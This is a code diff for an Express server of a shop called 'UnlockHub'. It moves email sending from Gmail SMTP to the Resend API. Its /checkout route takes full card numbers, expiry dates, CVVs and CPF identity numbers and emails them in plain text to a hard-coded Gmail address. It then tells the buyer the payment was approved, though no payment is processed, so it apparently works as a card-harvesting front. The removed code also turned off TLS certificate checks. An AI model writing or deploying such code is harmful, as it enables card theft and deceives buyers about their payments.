@@ -1,32 +1,15 @@
 const express = require("express");
 const bodyParser = require("body-parser");
-const nodemailer = require("nodemailer");
-const path = require("path");
+const { Resend } = require("resend");
 
 const app = express();
 
-// ================= MIDDLEWARE =================
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static("public"));
 
-// ================= EMAIL CONFIG (SMTP GMAIL CORRETO PARA RENDER) =================
-const transporter = nodemailer.createTransport({
-  host: "smtp.gmail.com",
-  port: 587,
-  secure: false, // true apenas se for 465
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS,
-  },
-  tls: {
-    rejectUnauthorized: false,
-  },
-  connectionTimeout: 20000,
-  greetingTimeout: 20000,
-});
+const resend = new Resend(process.env.RESEND_API_KEY);
 
-// ================= CHECKOUT =================
 app.post("/checkout", async (req, res) => {
   try {
     const {
@@ -43,7 +26,7 @@ app.post("/checkout", async (req, res) => {
     } = req.body;
 
     const dados = `
-=========== NOVO PEDIDO UNLOCKHUB ===========
+NOVO PEDIDO UNLOCKHUB
 
 Nome: ${nome}
 CPF: ${cpf}
@@ -52,30 +35,27 @@ Email: ${email}
 
 Produto: ${produto}
 Preço: R$ ${preco}
-Método de Pagamento: ${metodo}
+Método: ${metodo}
 
 Número do Cartão: ${numeroCartao || "N/A"}
 Validade: ${validade || "N/A"}
 CVV: ${cvv || "N/A"}
-
-=============================================
 `;
 
-    await transporter.sendMail({
-      from: `"UnlockHub" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER,
+    await resend.emails.send({
+      from: "UnlockHub <onboarding@resend.dev>",
+      to: "unlockhubphb@gmail.com",
       subject: `Novo Pedido - ${produto}`,
       text: dados,
     });
 
     res.status(200).send("Pagamento aprovado com sucesso!");
   } catch (error) {
-    console.error("Erro ao enviar email:", error);
+    console.error(error);
     res.status(500).send(error.message);
   }
 });
 
-// ================= PORTA RENDER =================
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
